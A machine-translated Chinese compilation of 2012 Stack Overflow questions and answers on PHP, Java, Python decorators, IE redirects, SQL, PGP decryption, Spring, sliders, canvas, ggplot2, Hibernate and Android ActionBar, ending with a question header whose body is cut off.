我被要求编写一个小的 PHP 脚本，该脚本从几个下拉框中获取一些 POST 输入，这些下拉框中给出了一些可选择的标准，最后，吐出一个或多个包含唯一代码的字符串变量。

变量*名称*的格式为 $thingPlaceType，并且每一个都是唯一的。下拉框允许选择：

*   一个“事物”或所有“事物”在一起
*   一个“地方”或所有“地方”在一起
*   一种“类型”或所有“类型”一起

如果不求助于嵌套的 switch 语句，我无法弄清楚如何选择这些代码

```
switch($_POST['thing'])
{
  case "thing1":
     switch($_POST['place'])
     {
       case "place1":
          switch($_POST['type'])
          {
            case "type1":
               $output = $thing1Place1Type1;
            case "type2":
               $output = $thing1Place1Type2;
            case "alltypes":
               $output = $thing1Place1Type1.$thing1Place1Type2.$thing1PlaceType3;
           }
        case "place2":
        ...
        case "allplaces":
        ...
      }
  case "thing2":
     switch($_POST['place'])
     {
       case "place1":
          switch($_POST['type'])
          {
            case "type1":
               $output = $thing1Place1Type1;
            ...
      ...
  ...
} 
```

似乎代码正在变成箭头反模式。我想我可以使用多维数组或单个数组来做一些事情，我将值与键进行匹配。但我觉得那是在抓着稻草，一定有什么我错过了。是时候将字符串转换为具有属性的适当对象了吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-25T16:18:18.457

您需要将代码重构为函数。例如：-

```
switch($_POST['thing'])
{
  case "thing1":
      $result = processThings($thing1);
      break;
  case "thing2":
      $result = processThings($thing2);
      break;
}

function processThings($thing)
{
    //processing code goes here
} 
```

我相信你明白了。如果您愿意，您可以在函数中添加更多的 switch 块，这将避免您的反模式并使您的代码更易于理解。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-25T16:45:01.473

如果您想将它们转换为对象..您可以创建它。

```
 class Object {
        private $thing;
        private $place;
        private $type;

        public function __construct() {
            $this->thing = $_POST['thing'];
            $this->place = $_POST['place'];
            $this->type  = $_POST['type'];

            $this->processThing($this->thing, $this->place, $this->type);
        }

        public function processThing($thing = false, $place = false, $type = false) {
               //noW that you have all the properties you just need just process it
        }

    }

    if(isset($_POST['thing']) && isset($_POST['place']) && isset($_POST['type'])) {
        $object = new Object();
    } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-25T16:18:27.010

好吧，如果您能找到一种方法来避免人们损害您的网站 - 也许通过在目标变量名称上使用前缀，那么您也许可以这样做：

```
$variableName = "A prefix_".$_POST['thing'].$_POST['type'].$_POST['place'];

$evaluatedVariable = $$variableName; 
```

这些被称为“变量”。可能我会因为使用它们而被激怒，但如果你能负责任地使用它们，我发现它们在过去很有用。

当然，这不会直接适用于您的“所有类型”案例。您可以使用该建议重构为函数

# java - Java中通过引用删除对象

> ID：10757870
> 
> 赞同：1
> 
> 时间：2012-05-25T16:09:21.010
> 
> 标签：java, arrays, object

这是一个奇怪的问题。但是这里。

我有对象 X，它被插入到数组中、哈希表中、另一个对象（容器对象）中，它表示 X 在 3d 空间中点 P 处的实例。

有时我想在给定的 P 处刷新 X。这很简单——从表中调用点 P 并直接操作数组。

现在说那些 X 是 Y 的一部分 - 准确地说是 Y 的片段。假设给定的 Y 消失了。现在，如果 Y 消失，所有与它相连的 X 也应该消失，对吧？

准确地说，对象 Y 在概念上已从模型中移除。它是否被实际删除并不重要（例如，它可能存储在其他地方。）但重点是，除了检查 Y 附近的每个点的 X 之外，我如何正确地将它们从哈希表中删除？

1.  它们是数组的一部分，所以另一个 Y 的 X 也可能在那里，所以我们只需要删除属于给定 Y 的 X。
2.  我们可以搜索属于 Y 的 X 的哈希表结构——例如，我们可以找出 Y 将占据的所有点 P，然后拉出这些容器并删除所有附加到 Y 的 X。
3.  我们可以直接删除它们吗？如果 Y 有其 X 的列表，是否可以通过引用将它们删除，而无需通过搜索表的工作？

这实际上是关于整个引用的一般性问题。在其他情况下，存在对一个对象的多个引用，我希望能够快速删除该对象，而无需在其他位置导航到它。

这意味着当一个引用类删除对象时，该对象应该被普遍“删除”；其他任何清单都不应保留对它的引用。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-25T16:17:20.967

在 Java 中，这个问题通常通过[`WeakReference<T>`](http://docs.oracle.com/javase/1.5.0/docs/api/java/lang/ref/WeakReference.html)对象来解决：如果您不希望引用来阻止对象`X`被收集，请将其设置为：当不再从其他任何地方强烈引用`WeakReference<X>`时，Java 会将其清空。`X`

例如，您可以创建一个`List<X>`保持所有活动对象的 a，并使所有其他引用为`X`弱。当一个对象从列表中删除并且它的最后一个强引用消失时，无论对它的弱引用的数量如何，它都会变得可收集。明显的缺点是在取消引用每个弱引用之前需要注意空值。此时，Java 会为您完成所有引用跟踪；您需要做的就是清除为空的弱引用，这比搜索大量列表要容易得多。

# python - 在python中装饰递归函数

> ID：10757871
> 
> 赞同：16
> 
> 时间：2012-05-25T16:09:21.623
> 
> 标签：python, recursion, decorator

我很难理解修饰的递归函数是如何工作的。对于以下代码段：

```
def dec(f):
    def wrapper(*argv):
        print(argv, 'Decorated!')
        return(f(*argv))
    return(wrapper)

def f(n):
    print(n, 'Original!')
    if n == 1: return(1)
    else: return(f(n - 1) + n)

print(f(5))
print

dec_f = dec(f)
print(dec_f(5))
print

f = dec(f)
print(f(5)) 
```

输出是：

```
(5, 'Original!')
(4, 'Original!')
(3, 'Original!')
(2, 'Original!')
(1, 'Original!')
15

((5,), 'Decorated!')
(5, 'Original!')
(4, 'Original!')
(3, 'Original!')
(2, 'Original!')
(1, 'Original!')
15

((5,), 'Decorated!')
(5, 'Original!')
((4,), 'Decorated!')
(4, 'Original!')
((3,), 'Decorated!')
(3, 'Original!')
((2,), 'Decorated!')
(2, 'Original!')
((1,), 'Decorated!')
(1, 'Original!')
15 
```

第一个打印 f(n) ，因此每次递归调用 f(n) 时它都会自然地打印 'Original' 。

第二个打印 def_f(n)，所以当 n 被传递给包装器时，它递归地调用 f(n)。但是包装器本身不是递归的，因此只打印了一个“装饰”。

第三个让我很困惑，这和使用装饰器@dec 是一样的。为什么装饰的 f(n) 也会五次调用包装器？在我看来 def_f=dec(f) 和 f=dec(f) 只是绑定到两个相同函数对象的两个关键字。当装饰函数与未装饰函数的名称相同时，是否还有其他事情发生？

谢谢！

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-05-25T16:19:02.370

正如你所说，第一个像往常一样被调用。

第二个将 f 的修饰版本称为 dec_f 放在全局范围内。调用 Dec_f，因此打印“装饰！”，但在传递给 dec 的 f 函数内部，您调用 f 本身，而不是 dec_f。在全局范围内查找并找到名称 f，它仍然在没有包装器的情况下定义，因此从那时起，只有 f 被调用。

在 3re 示例中，您将修饰版本分配给名称 f，因此当在函数 f 内部查找名称 f 时，它会在全局范围内查找 f，它现在是修饰版本。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-05-25T16:13:59.187

Python 中的所有赋值只是将名称绑定到对象。当你有

```
f = dec(f) 
```

您正在做的是将名称绑定`f`到`dec(f)`. 至此，`f`不再指代原来的功能。原始函数仍然存在并由 new 调用`f`，但您不再有对原始函数的*命名*引用。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2016-10-23T18:12:29.400

如果装饰器指示要在另一个函数之前或之后完成序言/尾声*，*我们可以避免*多次*使用递归函数模拟装饰器。

例如：

```
def timing(f):
    def wrapper(*args):
       t1 = time.clock();
       r = apply(f,args)
       t2 = time.clock();
       print"%f seconds" % (t2-t1)
       return r
    return wrapper

@timing
def fibonacci(n):
    if n==1 or n==2:
      return 1
    return fibonacci(n-1)+fibonacci(n-2)

r = fibonacci(5)
print "Fibonacci of %d is %d" % (5,r) 
```

产生：

```
0.000000 seconds
0.000001 seconds
0.000026 seconds
0.000001 seconds
0.000030 seconds
0.000000 seconds
0.000001 seconds
0.000007 seconds
0.000045 seconds
Fibonacci of 5 is 5 
```

我们可以模拟装饰器以仅强制一个序言/尾声为：

```
r = timing(fibonacci)(5)
print "Fibonacci %d of is %d" % (5,r) 
```

产生：

```
0.000010 seconds
Fibonacci 5 of is 5 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-25T16:15:13.747

你的函数调用了一个叫做 的东西`f`，python 在封闭范围内查找它。

直到 statement `f = dec(f)`,`f`仍然绑定到展开的函数，所以这就是被调用的。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2021-01-27T14:49:41.973

如果您进行一些函数自省并打印相应的内存 id，您会看到虽然原始函数 id 在闭包中“烘焙”，但实际上是在递归内部调用的闭包函数

```
def dec(func):
    def wrapper(*argv):
        print(argv, 'Decorated!')
        print("func id inside wrapper= ", hex(id(func)))
        return(func(*argv))
    return(wrapper)

def f(n):
    print(n, 'Original!')
    print("f id inside recursive function = ", hex(id(f)))
    if n == 1: return(1)
    else: return(f(n - 1) + n)

orig_id = hex(id(f))
print("recursive f id after its definition = ", orig_id)

f = dec(f)
closure_id = hex(id(f))
print("id of the closure = ", closure_id)

print("function object is at {0}".format(orig_id), f.__closure__)

print(f(1)) 
```

如果你运行上面的代码，你会得到

```
recursive f id after its definition =  0x1ce45be19d0
id of the closure =  0x1ce45c49a60
function object is at 0x1ce45be19d0 (<cell at 0x000001CE45AFACD0: function object at 0x000001CE45BE19D0>,)
(1,) Decorated!
func id inside wrapper=  0x1ce45be19d0
1 Original!
f id inside recursive function =  0x1ce45c49a60
1 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2017-08-10T08:19:38.577

稍微改变了你的代码

```
def dec(func):
    def wrapper(*argv):
        print(argv, 'Decorated!')
        return(func(*argv))
    return(wrapper)

def f(n):
    print(n, 'Original!')
    if n == 1: return(1)
    else: return(f(n - 1) + n)

print(f(5))
print

dec_f = dec(f)
print(dec_f(5))
print

f = dec(f)
print(f(5)) 
```

我认为这会让事情在这里变得更清楚，包装函数实际上从封闭范围中关闭了 func 对象。因此，包装器内对 func 的每次调用都会调用原始 f，但 f 内的递归调用将调用 f 的修饰版本。

您实际上可以通过简单地打印`func.__name__`内部包装器和`f.__name__`函数内部来看到这一点`f`

# javascript - 元标记在刷新页面上不起作用 (F5)

> ID：10757876
> 
> 赞同：0
> 
> 时间：2012-05-25T16:09:45.727
> 
> 标签：javascript, asp.net, asp-classic, w3c

我在 asp 经典页面中使用元标记在 5 秒后将用户重定向到我们的职业页面。

页面在您第一次访问时工作正常，但如果我刷新此页面或按 F5，则系统不会将我重定向到特定页面 (IE)。

我在以下两种格式上使用了元标记，但仍然看到相同的结果。

`<meta http-equiv="refresh" content="5; URL=/careers/opportunities.asp" />`

`<meta http-equiv="refresh" content="5; URL=http://www.mycompany.com/careers/opportunities.asp" />`

两个元标记都可以在 Firefox 上正常工作。

IE的任何修复？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-26T12:20:05.473

将此也添加到页面中，它应该可以解决问题。

```
 <script language="javascript" type="text/javascript">
   x = setTimeout("window.location='whereever.asp';",5000);  //5000 = 5 seconds
 </script> 
```

这是 Javascript，这意味着它在客户端上运行，并暂停 5 秒。

如果您想在服务器上进行硬重定向而不发出任何通知`You are being redirected`，那么您可以使用`Response.Redirect`

```
 Response.Redirect("/whereever.asp") 
```

或者

```
Response.Status = "301 Moved Permanently"
Response.AddHeader "Location","/whereever.asp" 
```

由于 Response.Redirect 为搜索引擎提供了另一个状态代码，如果不需要 SEO，那么这些方法中的任何一个都可以工作。

# sql - 如果插入新行作为更新方法，如何级联更改？

> ID：10757885
> 
> 赞同：0
> 
> 时间：2012-05-25T16:10:42.810
> 
> 标签：sql, sql-server, triggers

我有一个包含字段 PK、用户名、DOB 等状态的表。如果我更改用户名，我不会更新原始行，而是使用新用户名插入包含原始信息的新行，并将旧行状态设置为 0。（所以我不删除任何信息）。如何更新将旧行 pk 作为新行 pk 外键的表？我认为 On Casacade 行不通。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-25T17:25:38.193

同意主键应该在给定记录的整个生命周期内保持不变！实现用户名历史表并更新原始表中的用户名。将 PK 作为 FK 插入到历史表中并进行更改。您有一个跟踪更改的新表，并且您的原始表在那里服务于它的目的，仍然与其他表相关，因为它应该。

# encryption - 解密二进制文件问题

> ID：10757889
> 
> 赞同：0
> 
> 时间：2012-05-25T16:11:03.233
> 
> 标签：encryption, mcafee

我们正在尝试解密发送给我们的文件，该文件使用更新的密钥密码和哈希 AES-256 和 SHA2-256 以及我们的公钥。

当我们得到一个几 KB 的小文件时，我们可以解密，但是当他们发送一个几百 KB 的大文件时，文件就会失败。他们声称他们没有做任何不同的事情，我们与其他人没有问题。

在 Unix 上使用 McAfee EBusiness Server..

```
 Decoding data....

  event 1: initial
  event 13: BeginLex
  event 8: Analyze
  File is encrypted.  event 9: Recipients
  Secret key is required to read it.
  Key for user ID "Dev Co. <webdev@dev.com>"
  event 6: Passphrase
  event 23: Decryption

  symmetric cipher used: 3DES
  event 11: Output options
  typecode: 0062
  suggested name: 
  tempfile: created 'pgptemp.$0000'
  event 11: Output options
  typecode: 1000
  suggested name: 
  tempfile: created 'pgptemp.$0001'
  event 3: error -11443
  event 2: final
  Error decrypting file '.../processing/973160_IDRIN.txt.pgp'.
  Corrupt data.
  error decompressing data

  exitcode = 32 
```

想法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-25T16:47:04.793

您是否有更具体的密码说明符。例如AES256-CBC？sha256 是用来做什么的，hmac？他们使用什么样的填充？

AES 作为单个块的输入的最大内容是（除了密钥）数据块，即 128 位。如果您的少量数据少于此，我会说您的链接模式存在问题（这就是您实际使用仅处理 128 位块来加密其他内容的函数的方式）。但是，如果几 KB 的文件可以正常解密，这不是您的问题。

你使用什么样的填充？它可能在某处对长度进行编码，并且它们正在溢出它。但是，在我的脑海中，我想不出任何填充方案可以做到这一点。某些消息验证码 (MAC) 将对长度进行编码（例如 CBC mac）。

不过，我最好的猜测是，您处理文件的方式存在错误，而不是加密本身存在错误，并且某处的某些内容被截断了。但是，如果没有关于他们用于加密的任何细节，很难说。

# spring - 使用不同的 Spring 视图解析器

> ID：10757890
> 
> 赞同：0
> 
> 时间：2012-05-25T16:11:03.387
> 
> 标签：spring, model-view-controller, spring-mvc

我是春天的新手。我想知道 spring 中不同视图解析器的使用。我阅读了此链接[http://static.springsource.org/spring/docs/2.0.x/reference/mvc.html](http://static.springsource.org/spring/docs/2.0.x/reference/mvc.html)（第 13.5.1 节）以及我在 google 中找到的许多其他链接。但我没有完全了解它。我想知道何时使用哪个视图解析器。各有什么优缺点。如果你能指出一些包含详细解释并且新手可以理解的内容会更好。

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-25T16:29:01.817

如果您无法使用该在线教程，Spring In Action 是一个不错的起点。写得好，描述性强一点。

```
http://www.amazon.com/Spring-Action-Craig-Walls/dp/1932394354
http://my.safaribooksonline.com/book/programming/java/9781933988139 
```

春季博客也很棒：

```
http://blog.springsource.org/2011/01/04/green-beans-getting-started-with-spring-mvc/ 
```

# slider - 不支持 HTML5 输入类型范围时的滑块 UI？

> ID：10757894
> 
> 赞同：0
> 
> 时间：2012-05-25T16:11:30.447
> 
> 标签：slider

我需要类似 HTML 范围输入之类的东西来为我正在工作的网站输入内容，但我需要它与不支持此功能的旧版本 Android 一起使用。

```
<input type="range" value="10" min="0" max="100" /> 
```

支持时看起来有点像这样：http: [//jqueryui.com/demos/slider/](http://jqueryui.com/demos/slider/)

我只做一个演示，所以我需要的只是 UI，所以你可以沿着滑块拖动一点。该网站是移动优化的，所以需要一个触摸屏界面，这就是我不能使用 jQuery UI 的原因。有没有办法在不使用 jQuery Mobile 框架的情况下做到这一点？谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-29T11:48:22.233

我已经用 jQuery UI 完成了，这个 hack 让它在触摸屏上工作：http: [//touchpunch.furf.com/](http://touchpunch.furf.com/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-15T04:59:40.180

这是一个主要从头开始编写的滑块。也就是说，不使用任何 UI 库。我使用 jQuery、_ 和骨干网，但如果您不关心它们，可以将它们替换为执行相同操作的更原始版本的浏览器 API。[http://jsfiddle.net/shyamh/gBNAg/](http://jsfiddle.net/shyamh/gBNAg/)上的完整示例尚未添加触摸事件支持，但连接起来应该不会太难。

```
function slider(id, width) {

        var _i = this,

            // todo - can we refactor to get _thumbWidth from element styles?
            _thumbWidth = 24,

            _slideRange = width, 

            // View template for control. Typically this would be outside the class, 
            // so it's reused between multiple instance of this control.
            // The id is bound as a paremeter in the template. There may be other parameters.
            //
            _t = '<div id="<%=id%>" class="slider" style="width:<%=width%>px;">' +
                 '  <div id="<%=id%>_track" class="sliderTrack"></div>' +
                 '  <div id="<%=id%>_thumbcontainer" class="sliderThumbContainer" style="width:' + _thumbWidth + 'px">' +
                 '    <div id="<%=id%>_thumb" class="sliderThumb"></div>' +
                 '  </div>' +
                 '</div>',

            _currentValue = 0,

            _$el = $(_.template(_t, { id: id, width: (width || 100) })),

            _el = _$el[0],

            _elTrack = $('#' + id + '_track:first', _el)[0],
            _elThumbContainer = $('#' + id + '_thumbcontainer:first', _el)[0];

        _.extend(_i, Backbone.Events);

        function x2Percent(x) {
            if (x < 0) {
                return 0;
            } else {
                var p = x / _slideRange * 100;
                if (p > 100) { p = 100; }
                return p;
            }
        }

        function moveThumbToX(x) {
            var offsetLeft = _$el.offset().left,
                p = x2Percent(x - offsetLeft),
                newX = (Math.round(p / 100 * _slideRange) - _thumbWidth / 2);

            newX = (newX < 0) ? 0 : ((newX > (width - _thumbWidth)) ? (width - _thumbWidth) : newX) ;

            _elThumbContainer.style.left = newX + "px";

            _currentValue = p;
        }

        function _elClick(e) {
            moveThumbToX(e.x);
            // todo - fire backbone event for slider changed event
        }

        function _elThumbContainerMouseDown(e) {
            document.addEventListener("mousemove", _mouseMove);
            document.addEventListener("mouseup", _mouseUp);
            e.preventDefault();
            e.stopPropagation();
            // todo - fire backbone event for slider drag-started event
        }

        function _mouseMove(e) {
            var x = e.x;
            e.preventDefault();
            requestAnimationFrame(function() {
                moveThumbToX(e.x);
                // todo - fire backbone event for slider dragging event
            });        
        }

        function _mouseUp(e) {
            e.preventDefault();
            document.removeEventListener("mousemove", _mouseMove);
            document.removeEventListener("mouseup", _mouseUp);
            // todo - fire backbone event for slider drag-ended event
        }

        // set the value to p, where p is between 0..100
        _i.setValue = function(p) {
            moveThumbToX(Math.round(p / 100 * _slideRange));    
        }

        _i.getElement = function () {
            return _el;
        }

        var _ctor = function () {
            _el.addEventListener("click", _elClick);
            _elThumbContainer.addEventListener("mousedown", _elThumbContainerMouseDown);
        }();
    } 
```

# javascript - Chrome 中的画布错误

> ID：10757897
> 
> 赞同：8
> 
> 时间：2012-05-25T16:11:35.463
> 
> 标签：javascript, canvas, html5-canvas

我似乎偶然发现了 Chrome 的画布实现中的一个错误。如果您创建一个宽大的画布元素（例如 17000），那么在画布下方一定距离后绘制到该画布的任何路径都将被绘制为宽度仅为一像素或两个像素。此外，宽度不能是整个像素，或者根本不绘制。

这是一个说明问题的示例。这两个矩形应该是相同的宽度，但它们不是。

[http://jsbin.com/ehuvew/2/edit](http://jsbin.com/ehuvew/2/edit)

有没有人遇到过这个？有谁知道解决方法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-29T15:28:04.630

我在 chrome Versão 19.0.1084.52 (Ubuntu) 上检查并确认了上述行为

还检查了它发生的限制及其 8192 像素宽

它似乎与此处报告的铬错误有关： [http ://code.google.com/p/chromium/issues/detail?id=121405](http://code.google.com/p/chromium/issues/detail?id=121405)

# php - 形式：复选框，名称属性 - 传递数组

> ID：10757900
> 
> 赞同：1
> 
> 时间：2012-05-25T16:11:47.413
> 
> 标签：php, xhtml

我有一个用 HTML 编码的复选框，到目前为止一切正常，但是我需要在复选框的 name 属性中传入一个数组。我知道当您将变量传递给 name 属性时，它很容易做到。但对于数组，它被证明是诡计多端的。

这是我的代码：

```
 <?php // spit out rest of the list
       $permiCheck = array();
       foreach($pList as $value){
        //go into array, get what is needed to pass into the name attribute
        echo '<tr>';

        echo '<td>';
        echo $value['PName'];
        echo '</td>';
        //pass an array in
        $permiCheck['Id'] = $value['Id'];
        $permiCheck['ItemId'] = $value['ItemId'];
        if($value['Id']!=null) {

        ?>
        <td style="text-align:center;"> <input type="checkbox" checked="yes" name="<?php $permiCheck;?>" value="" id="change"></td> 
```

完成此操作后，我打算通过 POST 方法检索数组中的内容以进行表单验证。

知道我该怎么做，非常感谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-25T16:15:07.330

对于变量：

```
<input type="checkbox" name="myVariable" /> 
```

对于数组：

```
<input type="checkbox" name="myArray[]" />
<input type="checkbox" name="myArray[]" />
<input type="checkbox" name="myArray[]" /> 
```

希望这能解决这个谜团；）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-25T16:16:47.347

复选框元素的名称必须是字符串，但是您可以将复选框用作数组。IE

```
<input type="checkbox" name="checkboxName[]" value="1"/>
<input type="checkbox" name="checkboxName[]" value="2"/> 
```

将返回

```
var_dump($_POST)

array
  'checkboxName' => 
    array
      0 => int 1
      1 => int 2 
```

我不确定你想做什么，但也许你可以这样做

```
<td style="text-align:center;">
    <input type="checkbox" checked="yes" name="<?=$permiCheck['ItemId']?>[]" value="<?=$permiCheck['Id']?>" id="change">
</td> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-25T17:30:51.220

实际上，您可以将数组作为值传递，甚至可以是多维的：

```
<?
$testarray = array('id'=> 1, 'value'=>"fifteen");
var_dump($_POST);
?>
<form method="post">
<input type="checkbox" checked="yes" name="permicheck[id1]" value="<?php print_r($testarray)?>" id="change">
<input type="checkbox" checked="yes" name="permicheck[id2]" value="<?php print_r($testarray)?>" id="change">
<input type="submit">
</form> 
```

It produces HTML output as follows:

```
<form method="post">
<input type="checkbox" checked="yes" name="permicheck[id1]" value="Array
(
    [id] => 1
    [value] => fifteen
)
" id="change">
<input type="checkbox" checked="yes" name="permicheck[id2]" value="Array
(
    [id] => 1
    [value] => fifteen
)
" id="change">
<input type="submit">
</form> 
```

And $_POST looks like this:

```
Array ( 
    [permicheck] => 
        Array ( 
        [id1] =>
            Array ( [id] => 1 [value] => fifteen ) 
        [id2] => 
            Array ( [id] => 1 [value] => fifteen ) 
        )
     ) 
```

However, doing this exposes your info to outsiders, which is generally bad, since it can expose you to web attacks. I'd recommend to store this array in $_SESSION and use simple check on those checkboxes; if that's not possible, consider using serialize() and some encryption, and then decrypting + unserialize() after you've received $_POST. It requires more work, but is much safer.

# r - 在ggplot2中使用geom_violin将统计信息传递给geoms

> ID：10757903
> 
> 赞同：5
> 
> 时间：2012-05-25T16:12:02.070
> 
> 标签：r, ggplot2

以下代码：

```
library(ggplot2)
theData <- data.frame(category <- sample(LETTERS[1:3], 1000, replace = T),
                  value <- rnorm(1000))
thePlot <- ggplot(theData,
              aes(x = category, y = value))
thePlot <- thePlot + geom_violin(fill = "BLACK")
thePlot <- thePlot + coord_flip()
print(thePlot) 
```

将产生这个情节：

![小提琴情节示例](../Images/3b065dac2db60a20ef9b96b51a8bb6ad.png)

但我想实现一种效果，即每个小提琴密度的填充（和颜色，理想情况下）的 alpha 值在密度较低的区域降低。也就是说，小提琴形状在曲线高度较小的地方逐渐消失在背景中，而在曲线高度较高的地方则是黑暗和不透明的。类似这种效果的东西：

![alpha 渐变示例](../Images/2c7cf59b4f4495fcb407a68461a73c46.png)

不幸的是，这些系数图是通过使用一个非常丑陋的 hack 生成的，并且考虑到新 geom_violin 的灵活性，我想知道在使用 geom_violin 时是否有一种直接的方法来实现这个 alpha 淡入淡出。

感谢您提供的任何见解！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-11T17:06:03.443

受到@wch 回答的启发，我决定再试一次。这和我得到的一样接近：

```
ggplot(theData, aes(x = category, y = value)) +
    stat_ydensity(geom="segment", aes(xend=..x..+..scaled../2, 
        yend=..y.., alpha=..scaled..), size=2, trim=FALSE) +
    stat_ydensity(geom="segment", aes(xend=..x..-..scaled../2, 
        yend=..y.., alpha=..scaled..), size=2, trim=FALSE) +
    scale_alpha_continuous(range= c(0, 1)) +
    coord_flip() + theme_bw() 
```

[![在此处输入图像描述](../Images/4eafc35b6904f96e1184a0724a02ee01.png)](https://i.stack.imgur.com/aGRo9.png)

在早期版本中`ggplot2`，情节显示“带”，但这个问题现在显然已得到解决。

![在此处输入图像描述](../Images/a1dd2413414be26605bbde9c00a153ad.png)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-11T06:30:57.870

这实际上是可能的，通过使用一些技巧`stat_ydensity`：

```
library(ggplot2)
theData <- data.frame(category <- sample(LETTERS[1:3], 1000, replace = T),
                  value <- rnorm(1000))

ggplot(theData, aes(x = category, y = value)) +
    stat_ydensity(geom="line", aes(alpha=..scaled..), size=2, trim=FALSE) +
    scale_alpha_continuous(range= c(0, 1)) +
    coord_flip() + theme_bw() 
```

# java - 休眠一对多

> ID：10757904
> 
> 赞同：0
> 
> 时间：2012-05-25T16:12:03.437
> 
> 标签：java, hibernate, one-to-many

休眠有问题。我有实体用户

```
@Entity
@Table(name = "user")

public class User {
@Id
@Column(name = "user_id")
@GeneratedValue
private Long userId;

@Column
@NotBlank(message = "Fill login")
private String login;

@OneToMany(fetch=FetchType.LAZY,mappedBy="user")
private List<Order> orders;

public List<Order> getOrders() {
    return orders;
}
public void addOrders(Order order) {
    this.orders.add(order);
} 
```

也像你可以看到用户有订单。所以在 ORDER 表中我有指向 USER_ID 的 FK 所以这里是我的实体 Order

```
@Entity
@Table(name = "order")
public class Order {

    @Id
    @Column(name="order_id")
    @GeneratedValue
    private long orderId;   
    @Column 
    private long user_id;
    @Column
    private Date dateBegin;
    private Date dateEnd;

} 
```

这里是我的单元测试

```
public class HibernateTutorial extends BaseTest{

    @Autowired
    SessionFactory sessionFactory;
    @Test
    public void hibernateTutorial(){        
        System.out.print(sessionFactory);       

        List<User> users =  sessionFactory.getCurrentSession().createQuery("from User").list();
        List<Order> orders = users.get(0).getOrders(); 

        System.out.print(orders);   
        Assert.assertNotNull(users);    

    }

} 
```

运行时出现异常：

```
Caused by: org.hibernate.AnnotationException: mappedBy reference an unknown target entity property  entity.Order.user in entity.User.orders
at org.hibernate.cfg.annotations.CollectionBinder.bindStarToManySecondPass(CollectionBinder.java:576)
at org.hibernate.cfg.annotations.CollectionBinder$1.secondPass(CollectionBinder.java:541)
at org.hibernate.cfg.CollectionSecondPass.doSecondPass(CollectionSecondPass.java:66)
at org.hibernate.cfg.Configuration.secondPassCompile(Configuration.java:1177)
at org.hibernate.cfg.AnnotationConfiguration.secondPassCompile(AnnotationConfiguration.java:324)
at org.hibernate.cfg.Configuration.buildMappings(Configuration.java:1162)
at org.springframework.orm.hibernate3.LocalSessionFactoryBean.buildSessionFactory(LocalSessionFactoryBean.java:717)
at org.springframework.orm.hibernate3.AbstractSessionFactoryBean.afterPropertiesSet(AbstractSessionFactoryBean.java:211)
at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1477)
at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1417)
... 38 more 
```

我做错了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-25T16:19:17.597

You need an instance of User in your Order class.

Here is an [example of One-to-many.](http://www.mkyong.com/hibernate/hibernate-one-to-many-relationship-example-annotation/)

So, you might add something like this to the Order class:

```
private User user;

@ManyToOne(fetch = FetchType.LAZY)
@JoinColumn(name = "user_id")
public User getUser() {
  return this.user;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-25T16:29:05.613

mappedBy 属性指示关联表中定义关系的字段。如果您想保持 mappedBy 原样，您需要添加：

```
private User user; 
```

到您的订单类别。此外，您需要在关系的这一侧添加一个 @ManyToOne 并定义连接列的语义。双向性并不总是必需的，但在这种情况下，您的业务似乎需要让用户知道订单，这是正确的方法。

作为一般规则，您应该在 Hibernate 实体之间使用完整的 Object 关系，而不是让实体引用彼此的 id 值。Hibernate 将为您正确管理保存和更新，并且获取 id 与完整对象很容易由您自己管理。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-25T16:24:38.230

这个：

```
@Column 
private long user_id; 
```

需要替换为引用

```
@ManyToOne(fetch=FetchType.LAZY)
@JoinColumn(name="user_id")
private User user; 
```

和多对一的映射。

# android - 具有替代显示的 ActionBar 列表导航

> ID：10757915
> 
> 赞同：1
> 
> 时间：2012-05-25T16:13:16.663
> 
> 标签：android, android-actionbar, actionbarsherlock

我正在尝试在 Google 日历中重新创建操作栏的一个方面 - 特别是我想显示一个标题（图像中的“2012 年 5 月”），单击该标题时会提供一个下拉菜单，其中的标题不是其中的一部分.

有没有人有办法做到这一点 - 理想情况下，我正在寻找可以在 ActionBarSherlock 中工作的东西，以提供向后兼容性。

![在此处输入图像描述](../Images/7c83fe515346b2f17dacb374abdd4167.png)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-01T17:49:27.020

今天试图达到完全相同的结果，当然最好的方法是在[这里查看 Google 自己的日历源](https://android.googlesource.com/platform/packages/apps/Calendar)（感谢[Nicolas Klein](https://plus.google.com/u/0/104906570725395999813/about)）。

您要查看的代码在 AllInOneActivity 中使用，它使用自定义 Adapter（CalendarViewAdapter 扩展 BaseAdapater）和两种不同的布局（actionbar_pulldown_menu_button.xml 和 actionbar_pulldown_menu_top_button.xml）

他们基本上是在适配器的 getDropDownView 方法和 getView 方法中的顶部菜单布局中膨胀菜单布局。

# java - 使用 Java 将 Google 日历数据（通过 API v3）导入 Google App Engine

> ID：10757920
> 
> 赞同：7
> 
> 时间：2012-05-25T16:13:49.930
> 
> 标签：java, google-app-engine, google-calendar-api

